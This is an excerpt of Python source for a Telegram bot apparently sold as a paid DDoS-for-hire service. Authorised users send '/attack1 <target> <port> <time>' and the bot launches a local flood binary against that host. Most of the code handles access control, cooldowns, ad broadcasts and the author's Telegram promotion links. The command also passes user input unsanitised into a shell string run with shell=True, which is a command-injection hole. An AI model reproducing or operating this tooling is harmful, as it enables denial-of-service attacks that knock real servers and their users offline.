...
def start_attack_reply(message, target, port, time):
    ...
    response = f"{username}, \n✨✨Premium \nAttack1 STARTED 🚀 BY 7H shubh.\n\n📡 𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n🔌 𝐏𝐨𝐫𝐭: {port}\n⏱️ 𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n\n𝐌𝐞𝐭𝐡𝐨𝐝: Premium \nBy https://t.me/+nx6qIXbK--kzNTA1"
    bot.reply_to(message, response)
    ...
    if user_id in allowed_user_ids:
        ...
        if user_id not in admin_id:
            if user_id in bgmi_cooldown:
                ...
                if time_since_last_attack < 120:
                    remaining_time = 120 - time_since_last_attack
        ...
        if len(command) == 4:  # Updated to accept target, time, and port
            ...
            if time >120:
                ...
                full_command = f"./fuck {target} {port} {time} 877"
                subprocess.run(full_command, shell=True)
                response = f"Attack 🚀\nAttack Finished. \n📡 Target: {target} \n🔌 Port: {port} \n⏱️ Time: {time} \n BY https://t.me/+nx6qIXbK--kzNTA1"
        else:
            response = "Usage :- /attack1 <target> <port> <time>\nBy https://t.me/+nx6qIXbK--kzNTA1"  # Updated command syntax
    else:
        response = "You Are Not User's To Authorized To Use This Command.\nBy PERFECT BOT DM TO GET ACCESS @Shubham_Chity"
...
def broadcast_message(message):
    ...
    if user_id in admin_id:
        ...
        if len(command) > 1:
            message_to_broadcast = "AGR MERI FILE SAHI SE WORK NHI KR RHI TI PAID LO 120 SEC OWNER 7H shubh:\n\n" + command[1]
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                for user_id in user_ids:
                    try:
...
while True:
 ...
 #https://t.me/Kasukabe1 OWMER @Shubham_Chity
